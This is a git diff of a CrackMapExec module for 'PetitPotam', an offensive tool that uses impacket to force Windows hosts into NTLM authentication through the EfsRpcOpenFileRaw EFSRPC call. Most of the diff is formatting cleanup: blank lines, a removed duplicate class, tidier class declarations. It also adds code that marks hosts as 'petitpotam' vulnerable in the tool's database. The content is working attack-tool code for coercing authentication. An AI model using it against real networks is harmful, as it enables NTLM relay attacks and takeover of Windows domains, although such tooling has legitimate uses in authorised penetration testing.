@@ -12,6 +12,7 @@ from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, NULL, BOOL, UCHA
 from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
 from impacket.uuid import uuidtup_to_bin
 
+
 class CMEModule:
 
     name = 'petitpotam'
@@ -32,13 +33,17 @@ class CMEModule:
         if 'PIPE' in module_options:
             self.pipe  = module_options['PIPE']
 
-
     def on_login(self, context, connection):
         plop = CoerceAuth()
         dce = plop.connect(connection.username, password=connection.password, domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, target=connection.host, pipe=self.pipe, targetIp=connection.host)
         if plop.EfsRpcOpenFileRaw(dce, self.listener):
             context.log.highlight("VULNERABLE")
             context.log.highlight("Next step: https://github.com/topotam/PetitPotam")
+            try:
+                host = context.db.get_computers(connection.host)[0]
+                context.db.add_computer(host.ip, host.hostname, host.domain, host.os, host.smbv1, host.signing, petitpotam=True)
+            except Exception as e:
+                logging.debug(f"Error updating petitpotam status in database")
 
 
 class DCERPCSessionError(DCERPCException):
@@ -63,72 +68,86 @@ class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
     structure = (
         ('Data', '20s'),
     )
-class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
-    align = 1
-    structure = (
-        ('Data', '20s'),
-    )
+
+
 class EFS_EXIM_PIPE(NDRSTRUCT):
     align = 1
     structure = (
         ('Data', ':'),
     )
+
+
 class EFS_HASH_BLOB(NDRSTRUCT):
     
     structure = (
         ('Data', DWORD),
         ('cbData', PCHAR),
     )
+
+
 class EFS_RPC_BLOB(NDRSTRUCT):
     
     structure = (
         ('Data', DWORD),
         ('cbData', PCHAR),
     )
-    
+
+
 class EFS_CERTIFICATE_BLOB(NDRSTRUCT):
     structure = (
         ('Type', DWORD),
         ('Data', DWORD),
         ('cbData', PCHAR),
-    )    
+    )
+
+
 class ENCRYPTION_CERTIFICATE_HASH(NDRSTRUCT):
     structure = (
         ('Lenght', DWORD),
         ('SID', RPC_SID),
         ('Hash', EFS_HASH_BLOB),
         ('Display', LPWSTR),
-    )   
+    )
+
 class ENCRYPTION_CERTIFICATE(NDRSTRUCT):
     structure = (
         ('Lenght', DWORD),
         ('SID', RPC_SID),
         ('Hash', EFS_CERTIFICATE_BLOB),
    
-    )   
+    )
+
+
 class ENCRYPTION_CERTIFICATE_HASH_LIST(NDRSTRUCT):
     align = 1
     structure = (
         ('Cert', DWORD),
         ('Users', ENCRYPTION_CERTIFICATE_HASH),
     )
+
+
 class ENCRYPTED_FILE_METADATA_SIGNATURE(NDRSTRUCT):    
     structure = (
         ('Type', DWORD),
         ('HASH', ENCRYPTION_CERTIFICATE_HASH_LIST),
         ('Certif', ENCRYPTION_CERTIFICATE),
         ('Blob', EFS_RPC_BLOB),
-    )   
+    )
+
+
 class EFS_RPC_BLOB(NDRSTRUCT):
     structure = (
         ('Data', DWORD),
         ('cbData', PCHAR),
     )
+
+
 class ENCRYPTION_CERTIFICATE_LIST(NDRSTRUCT):
     align = 1
     structure = (
         ('Data', ':'),
     )
+
 
 ################################################################################
 # RPC CALLS
@@ -139,12 +158,14 @@ class EfsRpcOpenFileRaw(NDRCALL):
         ('fileName', WSTR), 
         ('Flag', ULONG),
     )
-    
+
+
 class EfsRpcOpenFileRawResponse(NDRCALL):
     structure = (
         ('hContext', EXIMPORT_CONTEXT_HANDLE),
         ('ErrorCode', ULONG),
     )
+
 
 class EfsRpcEncryptFileSrv(NDRCALL):
     opnum = 4
@@ -152,12 +173,14 @@ class EfsRpcEncryptFileSrv(NDRCALL):
         ('FileName', WSTR),
     )
 
+
 class EfsRpcEncryptFileSrvResponse(NDRCALL):
     structure = (
         ('ErrorCode', ULONG),
     )
 
-class CoerceAuth():
+
+class CoerceAuth:
     def connect(self, username, password, domain, lmhash, nthash, target, pipe, targetIp):
         binding_params = {
             'lsarpc': {
